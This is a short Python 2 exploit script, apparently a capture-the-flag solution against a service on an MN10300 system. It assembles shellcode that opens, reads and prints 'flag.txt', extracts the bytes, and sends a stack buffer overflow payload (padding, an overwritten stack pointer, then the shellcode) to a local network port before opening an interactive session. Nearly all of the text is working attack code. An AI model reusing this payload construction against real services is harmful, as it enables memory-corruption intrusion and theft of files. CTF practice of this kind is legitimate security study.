asm = '''.section .text
.global _start

.ascii "%s"
_start:
  nop
  nop

  # call get_addr
  .word 0xfffa
  .word 0x0004
get_addr:
  mov (0, sp), d2
  # len(shellcode) - 4
  add 39, d2
open:
  mov d2, d1
  clr d0
  mov d0, (12, sp)
  mov d0, (16, sp)
  mov 2, d0
  syscall
read:
  mov d0, d1
  mov a0, (12, sp)
  clr d0
  add 0x7f, d0
  mov d0, (16, sp)
  mov 4, d0
  syscall
write:
  mov 1, d1
  mov a0, (12, sp)
  clr d0
  add 0x7f, d0
  mov d0, (16, sp)
  mov 5, d0
  syscall
.ascii "%s"
'''
import os
from lib.mylib import *

ARCH = 'mn10300'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10009
s = mysock(IP, PORT)
s.send('\n000')
SP = 0x1b08
shellcode = 'AAAAAAAAAAAAAAAAAAAA' + p(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
